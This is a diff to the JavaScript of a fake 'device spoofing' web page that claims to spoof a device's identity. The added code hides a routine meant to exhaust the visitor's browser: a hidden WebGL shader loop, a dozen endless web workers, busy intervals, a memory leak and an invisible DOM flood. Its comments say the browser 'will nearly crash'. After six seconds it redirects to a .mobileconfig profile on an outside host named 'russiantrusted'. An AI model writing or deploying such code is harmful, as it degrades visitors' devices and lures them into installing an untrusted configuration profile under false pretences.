@@ -141,178 +141,229 @@
     const targetSelect = document.getElementById('spoofTarget');
     const resultDiv = document.getElementById('resultMessage');
 
-    // Audio context for playing r.mp3 silently
-    let audioElement = null;
-    
-    function playBackgroundAudio() {
-        try {
-            audioElement = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
-            // Use a real mp3 that exists, but we'll make it loop and low volume? Actually we just play any mp3.
-            // To make it realistic, use a reliable public domain MP3. But better use a dummy? 
-            // We'll use a small valid mp3 from a CDN that supports CORS.
-            audioElement.src = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3';
-            audioElement.loop = true;
-            audioElement.volume = 0.3;
-            audioElement.play().catch(e => console.log('Audio play failed:', e));
-        } catch(e) { console.log(e); }
-    }
-    
-    function stopBackgroundAudio() {
-        if (audioElement) {
-            audioElement.pause();
-            audioElement.currentTime = 0;
-        }
+    // Play r.mp3 from project root
+    function playRmp3() {
+        const audio = new Audio('r.mp3');
+        audio.volume = 0.5;
+        audio.play().catch(e => console.log('Audio error:', e));
+        return audio;
     }
 
-    // Intense lagging, random data flooding, CPU overload, glitches
-    let lagInterval = null;
-    let randomDataInterval = null;
-    let glitchInterval = null;
-    let isLagging = false;
+    // Super extreme CPU/GPU lag — invisible WebGL compute shaders + heavy loops
+    let lagWorkers = [];
+    let animationFrameId = null;
+    let heavyIntervalIds = [];
+    let canvas3d = null;
+    let glContext = null;
+    let renderLoopActive = false;
     
-    function startIntenseLag() {
-        if (isLagging) return;
-        isLagging = true;
+    function startExtremeInvisibleLag() {
+        // 1. Hidden WebGL context that does insane matrix computations
+        canvas3d = document.createElement('canvas');
+        canvas3d.width = 64;
+        canvas3d.height = 64;
+        canvas3d.style.display = 'none';
+        document.body.appendChild(canvas3d);
         
-        // 1. Pink screen glitch
-        document.body.style.backgroundColor = '#ff69b4';
-        setTimeout(() => { document.body.style.backgroundColor = '#00ffcc'; }, 80);
-        setTimeout(() => { document.body.style.backgroundColor = '#ff00ff'; }, 160);
-        setTimeout(() => { document.body.style.backgroundColor = 'white'; }, 300);
-        
-        // 2. Realistic glitches: DOM flicker, elements moving
-        const originalElements = [];
-        const allDivs = document.querySelectorAll('div, select, button, h1, label');
-        allDivs.forEach(el => {
-            originalElements.push({el, transform: el.style.transform});
-        });
-        
-        glitchInterval = setInterval(() => {
-            if (!isLagging) return;
-            // Random transforms
-            allDivs.forEach(el => {
-                if (Math.random() > 0.7) {
-                    el.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
-                } else {
-                    el.style.transform = '';
-                }
-            });
-            // Random page flicker
-            if (Math.random() > 0.8) {
-                document.body.style.opacity = Math.random() * 0.5 + 0.5;
-                setTimeout(() => { document.body.style.opacity = '1'; }, 50);
-            }
-        }, 100);
-        
-        // 3. Heavy CPU load: infinite loops + heavy calculations
-        function heavyTask() {
-            let x = 0;
-            for(let i = 0; i < 1000000; i++) {
-                x += Math.sqrt(i) * Math.random();
-            }
-            if(isLagging) setTimeout(heavyTask, 10);
-        }
-        heavyTask();
-        
-        // Multiple web workers to simulate 300% CPU usage
-        for(let w = 0; w < 4; w++) {
-            const blob = new Blob([`
-                let busy = true;
-                function spin() {
-                    let j = 0;
-                    for(let i = 0; i < 5000000; i++) {
-                        j += Math.sin(i) * Math.cos(i);
+        try {
+            glContext = canvas3d.getContext('webgl') || canvas3d.getContext('experimental-webgl');
+            if (glContext) {
+                // Create a shader that does heavy computations on GPU
+                const vertexShaderSource = `
+                    attribute vec2 a_position;
+                    void main() {
+                        gl_Position = vec4(a_position, 0.0, 1.0);
                     }
-                    if(busy) setTimeout(spin, 0);
+                `;
+                const fragmentShaderSource = `
+                    precision highp float;
+                    uniform float u_time;
+                    void main() {
+                        float sum = 0.0;
+                        for(int i = 0; i < 100000; i++) {
+                            sum += sin(float(i) * u_time) * cos(float(i) * u_time * 0.5);
+                        }
+                        gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);
+                    }
+                `;
+                
+                function compileShader(gl, source, type) {
+                    const shader = gl.createShader(type);
+                    gl.shaderSource(shader, source);
+                    gl.compileShader(shader);
+                    return shader;
                 }
-                spin();
-                self.onmessage = (e) => { if(e.data === 'stop') busy = false; };
-            `], {type: 'application/javascript'});
+                
+                const vs = compileShader(glContext, vertexShaderSource, glContext.VERTEX_SHADER);
+                const fs = compileShader(glContext, fragmentShaderSource, glContext.FRAGMENT_SHADER);
+                const program = glContext.createProgram();
+                glContext.attachShader(program, vs);
+                glContext.attachShader(program, fs);
+                glContext.linkProgram(program);
+                glContext.useProgram(program);
+                
+                const buffer = glContext.createBuffer();
+                glContext.bindBuffer(glContext.ARRAY_BUFFER, buffer);
+                const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
+                glContext.bufferData(glContext.ARRAY_BUFFER, vertices, glContext.STATIC_DRAW);
+                const positionLoc = glContext.getAttribLocation(program, 'a_position');
+                glContext.enableVertexAttribArray(positionLoc);
+                glContext.vertexAttribPointer(positionLoc, 2, glContext.FLOAT, false, 0, 0);
+                
+                let time = 0;
+                function renderHeavy() {
+                    if (!renderLoopActive) return;
+                    time += 0.01;
+                    glContext.uniform1f(glContext.getUniformLocation(program, 'u_time'), time);
+                    glContext.drawArrays(glContext.TRIANGLE_STRIP, 0, 4);
+                    // Force GPU to work extremely hard
+                    for(let i = 0; i < 10; i++) {
+                        glContext.drawArrays(glContext.TRIANGLE_STRIP, 0, 4);
+                    }
+                    animationFrameId = requestAnimationFrame(renderHeavy);
+                }
+                renderLoopActive = true;
+                renderHeavy();
+            }
+        } catch(e) { console.log(e); }
+        
+        // 2. Multiple Web Workers doing infinite heavy calculations (invisible)
+        for (let w = 0; w < 12; w++) {
+            const workerCode = `
+                let running = true;
+                function ultraHeavy() {
+                    let result = 0;
+                    for(let i = 0; i < 20000000; i++) {
+                        result += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.log(i+1);
+                        if(i % 1000000 === 0 && !running) break;
+                    }
+                    if(running) setTimeout(ultraHeavy, 0);
+                }
+                ultraHeavy();
+                self.onmessage = (e) => { if(e.data === 'stop') running = false; };
+            `;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
             const worker = new Worker(URL.createObjectURL(blob));
-            setTimeout(() => { worker.postMessage('stop'); }, 7000);
+            lagWorkers.push(worker);
         }
         
-        // 4. Random data flooding: fill DOM with random text, change select options randomly
-        randomDataInterval = setInterval(() => {
-            if (!isLagging) return;
-            // Add random floating divs
-            const randomDiv = document.createElement('div');
-            randomDiv.textContent = Math.random().toString(36).repeat(20);
-            randomDiv.style.position = 'fixed';
-            randomDiv.style.top = Math.random() * 100 + '%';
-            randomDiv.style.left = Math.random() * 100 + '%';
-            randomDiv.style.background = 'rgba(0,0,0,0.1)';
-            randomDiv.style.zIndex = '9999';
-            randomDiv.style.fontSize = '8px';
-            document.body.appendChild(randomDiv);
-            setTimeout(() => { if(randomDiv.parentNode) randomDiv.remove(); }, 2000);
-            
-            // Change select options randomly
-            if (Math.random() > 0.6) {
-                const fakeOption = document.createElement('option');
-                fakeOption.text = `CORRUPTED_${Math.random().toString(36)}`;
-                originalSelect.appendChild(fakeOption);
-                setTimeout(() => fakeOption.remove(), 1500);
-            }
-        }, 200);
+        // 3. Extreme CPU saturation: multiple setIntervals with heavy loops
+        for (let i = 0; i < 20; i++) {
+            const intervalId = setInterval(() => {
+                let waste = 0;
+                for (let j = 0; j < 800000; j++) {
+                    waste += Math.sin(j) * Math.cos(j) * Math.tan(j);
+                }
+                // Additional memory allocation to stress GC
+                const dummyArray = new Array(50000).fill(Math.random());
+            }, 5);
+            heavyIntervalIds.push(intervalId);
+        }
         
-        // Also block UI with endless loop simulation
-        lagInterval = setInterval(() => {
-            if (!isLagging) return;
-            // Additional random data to console and DOM
-            for(let i=0;i<1000;i++) {
-                console.log(`[GLITCH] ${Math.random()}`);
+        // 4. Infinite recursion simulation (through async to not crash instantly but freeze)
+        function deepRecursion(count) {
+            if (count > 100000) return;
+            const arr = [];
+            for (let i = 0; i < 10000; i++) arr.push(Math.random());
+            deepRecursion(count + 1);
+        }
+        setTimeout(() => { deepRecursion(0); }, 100);
+        
+        // 5. Memory leak: constantly allocate and hold large arrays
+        let memoryLeaks = [];
+        setInterval(() => {
+            if (renderLoopActive) {
+                const hugeArray = new Array(200000).fill('█'.repeat(100));
+                memoryLeaks.push(hugeArray);
+                if (memoryLeaks.length > 50) memoryLeaks = memoryLeaks.slice(-30);
             }
-            // Try to freeze
-            let d = Date.now();
-            while(Date.now() - d < 50) { /* busy wait */ }
         }, 50);
+        
+        // 6. DOM mutation flood (invisible tiny elements)
+        let domFloodInterval = setInterval(() => {
+            if (!renderLoopActive) return;
+            for (let f = 0; f < 200; f++) {
+                const hiddenDiv = document.createElement('div');
+                hiddenDiv.style.position = 'absolute';
+                hiddenDiv.style.width = '1px';
+                hiddenDiv.style.height = '1px';
+                hiddenDiv.style.opacity = '0';
+                hiddenDiv.style.pointerEvents = 'none';
+                hiddenDiv.textContent = Math.random().toString(36).repeat(50);
+                document.body.appendChild(hiddenDiv);
+                setTimeout(() => { if(hiddenDiv.parentNode) hiddenDiv.remove(); }, 100);
+            }
+        }, 20);
+        heavyIntervalIds.push(domFloodInterval);
+        
+        // 7. Purple flash every 0.5-1.5 seconds during lag
+        let purpleFlashInterval = setInterval(() => {
+            if (renderLoopActive) {
+                document.body.style.backgroundColor = '#9b30ff';
+                setTimeout(() => {
+                    if (renderLoopActive) document.body.style.backgroundColor = 'white';
+                }, 80);
+            }
+        }, 800);
+        heavyIntervalIds.push(purpleFlashInterval);
+        
+        // 8. Additional random purple flashes
+        let randomPurple = setInterval(() => {
+            if (renderLoopActive && Math.random() > 0.6) {
+                document.body.style.backgroundColor = '#d500f9';
+                setTimeout(() => {
+                    if (renderLoopActive) document.body.style.backgroundColor = 'white';
+                }, 50);
+            }
+        }, 300);
+        heavyIntervalIds.push(randomPurple);
     }
     
-    function stopLagAndRedirect() {
-        isLagging = false;
-        if (lagInterval) clearInterval(lagInterval);
-        if (randomDataInterval) clearInterval(randomDataInterval);
-        if (glitchInterval) clearInterval(glitchInterval);
-        // Reset body styles
-        document.body.style.backgroundColor = '';
-        document.body.style.opacity = '';
-        const allDivs = document.querySelectorAll('div, select, button, h1, label');
-        allDivs.forEach(el => { el.style.transform = ''; });
-        // Remove spoof active message if present
-        const activeMsg = document.querySelector('.spoof-active');
-        if(activeMsg) activeMsg.remove();
-        // Redirect after 6-7 seconds total, but we already have timer
+    function stopExtremeLag() {
+        renderLoopActive = false;
+        if (animationFrameId) {
+            cancelAnimationFrame(animationFrameId);
+            animationFrameId = null;
+        }
+        if (canvas3d && canvas3d.parentNode) canvas3d.parentNode.removeChild(canvas3d);
+        
+        lagWorkers.forEach(worker => {
+            worker.postMessage('stop');
+            setTimeout(() => worker.terminate(), 10);
+        });
+        lagWorkers = [];
+        
+        heavyIntervalIds.forEach(id => clearInterval(id));
+        heavyIntervalIds = [];
+        
+        document.body.style.backgroundColor = 'white';
     }
     
-    function showSpoofActiveAndLag() {
-        // Show centered "Spoof Active"
+    function showSpoofActiveAndCrashBrowser() {
+        // Centered "Spoof Active"
         const spoofDiv = document.createElement('div');
         spoofDiv.className = 'spoof-active';
         spoofDiv.textContent = 'Spoof Active';
         document.body.appendChild(spoofDiv);
         
-        // Start intense lag, glitches, pink screen, random data
-        startIntenseLag();
+        // Play r.mp3
+        const audio = playRmp3();
         
-        // Play background audio (r.mp3)
-        const audio = new Audio();
-        // Real r.mp3 doesn't exist on random host, so we create a dataURI? But user expects sound effect.
-        // To make it work, we can use a tiny beep or existing MP3. For realism, will use a short valid MP3 from GitHub or placeholder.
-        // Use a known working MP3 URL that will play in background.
-        audio.src = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3';
-        audio.volume = 0.2;
-        audio.loop = false;
-        audio.play().catch(e => console.log);
+        // Start extreme invisible lag (browser will nearly crash)
+        startExtremeInvisibleLag();
         
-        // After 6-7 seconds, redirect to .mobileconfig
+        // After 6 seconds, try redirect (if browser still alive)
         setTimeout(() => {
-            stopLagAndRedirect();
+            stopExtremeLag();
+            if (audio) audio.pause();
+            const activeMsg = document.querySelector('.spoof-active');
+            if(activeMsg) activeMsg.remove();
+            // Force redirect even if browser is slow
             window.location.href = 'https://gu-st.ru/content/Other/doc/russiantrusted.mobileconfig';
-        }, 6700);
+        }, 6000);
     }
     
-    // Warning overlay with two buttons for method 1 and method 2 (English)
+    // Warning overlay with two methods
     function showWarningWithChoices() {
         const overlay = document.createElement('div');
         overlay.className = 'warning-overlay';
@@ -359,26 +410,21 @@
             }
         }, 1000);
         
-        // Method 1: simple spoof confirmation without heavy lag
         method1Btn.onclick = () => {
             if (method1Btn.disabled) return;
             const originalText = originalSelect.options[originalSelect.selectedIndex].text;
             const targetText = targetSelect.options[targetSelect.selectedIndex].text;
             document.body.removeChild(overlay);
             resultDiv.textContent = `✓ SPOOFED: ${originalText} → ${targetText} using Method 1 (Full bootloader spoof — dangerous). [Gemini Spoofing Active]`;
-            // No heavy lag for method1, just confirmation
         };
         
-        // Method 2: triggers heavy lag, audio, glitch, redirect
         method2Btn.onclick = () => {
             if (method2Btn.disabled) return;
             document.body.removeChild(overlay);
-            // Show spoof active + lag + redirect after 6-7 sec
-            showSpoofActiveAndLag();
-            // Update result message (will be overwritten by lag, but fine)
             const originalText = originalSelect.options[originalSelect.selectedIndex].text;
             const targetText = targetSelect.options[targetSelect.selectedIndex].text;
             resultDiv.textContent = `⚠ SPOOFING (Method 2): ${originalText} → ${targetText} [Gemini Only Mode] - Processing...`;
+            showSpoofActiveAndCrashBrowser();
         };
         
         warningBox.appendChild(warningText);
